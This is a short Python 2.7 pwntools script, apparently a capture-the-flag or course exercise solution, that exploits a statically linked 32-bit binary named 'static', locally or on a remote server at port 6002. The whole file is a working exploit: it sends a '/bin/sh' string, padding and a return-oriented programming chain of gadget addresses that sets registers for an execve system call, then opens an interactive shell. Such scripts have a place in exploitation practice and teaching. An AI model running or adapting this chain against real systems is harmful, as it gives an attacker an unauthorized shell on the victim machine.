#!/usr/bin/env python2.7

from pwn import *

def start():
    global p
    global elf
    prog  = "./static"    

    if args.REMOTE:
        ip   = "plsdonthaq.me"
        port = 6002

        p = remote(ip, port)
        elf = ELF(prog)

    elif args.GDB:
        p = gdb.debug(prog)
        elf = ELF(prog)

    else:
        p = process(prog)
        elf = p.elf

start()

payload = b"/bin/sh\x00"
payload += b"A" * 0x8

# ebx := *(/bin/sh\x00)
payload += p32(0x0806ee5b)  # push eax; ...; pop ebx

# edx := 0
payload += p32(0x0806eb8b)  # pop edx; ret
payload += p32(0x00000000)

# eax := 0x0b
payload += p32(0x08056200)  # xor eax, eax; ret
payload += p32(0x0807c01a) * 11 # inc eax * 11

# ecx := 0; int 0x80
payload += p32(0x0806ef51)  # xor ecx, ecx; int 0x80

p.sendlineafter("\n", payload)

p.interactive()
p.close()